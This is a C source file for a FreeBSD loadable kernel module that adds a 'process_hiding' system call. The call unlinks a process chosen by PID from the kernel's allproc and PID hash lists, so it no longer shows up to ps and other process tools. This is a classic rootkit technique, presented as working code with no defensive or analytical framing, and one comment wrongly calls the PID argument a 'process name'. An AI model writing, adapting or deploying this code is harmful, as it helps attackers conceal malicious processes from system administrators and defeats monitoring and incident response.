#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>

struct process_hiding_args {
	pid_t p_pid;	/* process name */
};
/* System call to hide a running process. */

static int 
process_hiding(struct thread *td, void *syscall_args){

	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;

	struct proc *p;

	sx_xlock(&allproc_lock);
	
	/* Iterate through the allproc list. */
	LIST_FOREACH(p, PIDHASH(uap->p_pid), p_hash) {
		
		if(p->p_pid == uap->p_pid){
			if (p->p_state == PRS_NEW) {
				p = NULL;
				break;
			}
			PROC_LOCK(p);

			/* Hide this process. */
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);

			PROC_UNLOCK(p);

			break;
		}
	}
	sx_xunlock(&allproc_lock);
	return(0);
}


/* The sysent for the new system call. */
static struct sysent process_hiding_sysent = {
	1,		/* number of arguments */
	process_hiding	/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated */
static int offset = NO_SYSCALL;

static int
load(struct module *module, int cmd, void *arg){
	int error = 0;

	switch (cmd) {
		case MOD_LOAD:
			uprintf("System call loaded at offset %d.\n", offset);
			break;
		case MOD_UNLOAD:
			uprintf("System call unloaded from offset %d.\n", offset);
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}
	return(error);
}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);
